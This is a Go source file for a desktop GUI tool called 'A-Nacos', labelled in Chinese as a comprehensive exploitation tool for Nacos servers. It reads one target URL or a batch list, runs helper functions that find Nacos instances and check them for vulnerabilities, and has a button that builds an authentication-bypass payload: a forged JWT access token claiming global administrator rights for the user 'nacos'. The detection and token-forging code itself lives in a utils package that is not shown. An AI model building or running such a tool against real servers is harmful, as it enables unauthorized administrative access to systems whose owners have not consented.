package main

import (
	"MODULE_NAME/theme"
	"MODULE_NAME/utils"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/widget"
	"log"
	"os"
)

func main() {
	App := app.New()
	App.Settings().SetTheme(&theme.MyTheme{})
	Windows := App.NewWindow("A-Nacos")

	titlelabel := widget.NewLabel("Nacos综合利用工具")
	head := container.NewCenter(titlelabel)

	targetlabel := widget.NewLabel("目标url:")
	targetentry := widget.NewEntry()
	targetdia := widget.NewButton("批量导入", func() { //回调函数：打开选择文件对话框
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, Windows)
				return
			}
			if reader == nil {
				log.Println("Cancelled")
				return
			}
			targetentry.SetText(reader.URI().Path()) //把读取到的路径显示到输入框中
		}, Windows)
		fd.SetFilter(storage.NewExtensionFileFilter([]string{".txt"})) //打开的文件格式类型
		fd.Show()                                                      //控制是否弹出选择文件目录对话框
	})

	target := container.NewBorder(layout.NewSpacer(), layout.NewSpacer(), targetlabel, targetdia, targetentry)

	text := widget.NewMultiLineEntry()
	text.Resize(fyne.NewSize(990, 450))
	text.Wrapping = fyne.TextWrapBreak

	payloadbt := widget.NewButton("生成身份认证绕过payload", func() {
		go func() {
			text.Text += "===========================================================================\n"
			text.Text += "{\"accessToken\":\"" + utils.GenJWT() + "\",\"tokenTtl\":18000,\"globalAdmin\":true,\"username\":\"nacos\"}"
			text.Text += "\n************************************************************************************\n"
			text.Refresh()
		}()
	})
	resdowbt := widget.NewButton("结果保存", func() {
		go func() {
			if text.Text != "" {
				path := utils.WriteFile(text.Text)
				text.Text += "===========================================================================\n"
				text.Text += "结果保存在：" + path
				text.Text += "\n************************************************************************************\n"
				text.Refresh()
			}
		}()
	})
	Abt := widget.NewButton("开始测试", func() {
		go func() {
			text.Text += "----------------------------开始测试----------------------------------\n"
			text.Refresh()
			if _, err := os.Stat(targetentry.Text); err != nil {
				res, tip, flag := utils.FindNacos(targetentry.Text)
				if flag {
					text.Text += "===========================================================================\n"
					text.Text += tip
					for _, res := range utils.Checkvul(res) {
						text.Text += res
					}
					text.Text += "\n************************************************************************************\n"
					text.Refresh()
				} else {
					text.Text += "===========================================================================\n"
					text.Text += tip
					text.Text += "\n************************************************************************************\n"
					text.Refresh()
				}
			} else {
				for _, target := range utils.ReadFile(targetentry.Text) {
					res, tip, flag := utils.FindNacos(target)
					if flag {
						text.Text += "===========================================================================\n"
						text.Text += tip
						for _, res := range utils.Checkvul(res) {
							text.Text += res
						}
						text.Text += "\n************************************************************************************\n"
						text.Refresh()
					} else {
						text.Text += "===========================================================================\n"
						text.Text += tip
						text.Text += "\n************************************************************************************\n"
						text.Refresh()
					}
				}
			}
		}()
	})
	payload := container.NewHBox(payloadbt, resdowbt, Abt)
	textcon := container.NewWithoutLayout(text)
	content := container.NewVBox(head, target, payload, textcon)
	Windows.SetContent(content)
	Windows.Resize(fyne.NewSize(1000, 600))
	Windows.ShowAndRun()
}
